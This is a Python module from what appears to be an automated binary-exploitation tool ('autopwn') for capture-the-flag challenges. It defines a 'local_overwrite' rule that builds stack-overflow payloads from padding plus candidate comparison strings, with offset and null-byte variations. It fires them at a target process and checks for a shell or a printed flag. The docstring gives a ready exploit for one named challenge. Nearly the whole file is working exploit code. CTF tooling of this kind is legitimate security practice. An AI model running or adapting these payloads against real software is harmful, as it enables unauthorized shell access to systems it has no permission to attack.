"""Rule: overflow local comparison variable to pass check → system().

Pattern: gets/read/scanf fills a buffer adjacent to a comparison variable
on the stack.  Overflow with the correct comparison string bypasses the
check without touching the canary.  Works even with full protections
(PIE + Canary + NX + Full RELRO).

Example: mrctf2020_easyoverflow
  gets(rbp-0x70) → local var at rbp-0x40 compared via check() against
  global string "n0t_r3@11y_f1@g" → system("/bin/sh")
  Exploit: b'A'*48 + b'n0t_r3@11y_f1@g'
"""
from __future__ import annotations

from pwn import log

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import (
    open_target, verify_shell, verify_flag_output,
    interactive_or_close, safe_close,
)


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("local_overwrite"))


def _action(state) -> ActionResult:
    ctx = state.ctx
    info = state.discovered_facts["local_overwrite"]
    pad_size = info["pad_size"]
    target_strings = info.get("target_strings", [])

    log.info(f"Agent local_overwrite: pad={pad_size}, "
             f"{len(target_strings)} candidate strings")

    # Build payloads: padding + each candidate target string
    # Priority strings come first (from check function analysis)
    strategies: list[tuple[str, bytes]] = []
    for s in target_strings:
        s_bytes = s.encode("latin-1", errors="replace")
        strategies.append((f"str_{s[:20]}", b"A" * pad_size + s_bytes))
        # Also try with null terminator padding (some checks need exact length)
        strategies.append((f"str_{s[:20]}+nul",
                           b"A" * pad_size + s_bytes + b"\x00" * 8))

    # Try padding variations (off-by-4, off-by-8) in case offset is slightly off
    for s in target_strings[:3]:  # only try first 3
        s_bytes = s.encode("latin-1", errors="replace")
        for delta in (-8, -4, 4, 8):
            alt_pad = pad_size + delta
            if alt_pad > 0:
                strategies.append((f"str_{s[:16]}_pad{alt_pad}",
                                   b"A" * alt_pad + s_bytes))

    # Fallback: padding with zeros (check may accept zero/empty)
    strategies.append(("zeros", b"A" * pad_size + b"\x00" * 32))

    for name, payload in strategies:
        io = None
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            io.sendline(payload)

            # Check for flag output first (some challenges print flag, not shell)
            if verify_flag_output(io):
                log.success(f"Agent local_overwrite: strategy {name} got flag!")
                safe_close(io)
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="local_overwrite", success=True),
                )

            if verify_shell(io):
                log.success(f"Agent local_overwrite: strategy {name} got shell!")
                return ActionResult(
                    success=interactive_or_close(io, True),
                    record=AttemptRecord(strategy="local_overwrite", success=True),
                )
            safe_close(io)
        except Exception as exc:
            log.debug(f"local_overwrite {name} error: {exc}")
            if io:
                safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="local_overwrite",
                             diagnosis="no_string_worked"),
    )


RULES = [
    ("local_overwrite", 85, "overflow local comparison variable → system()",
     _condition, _action),
]
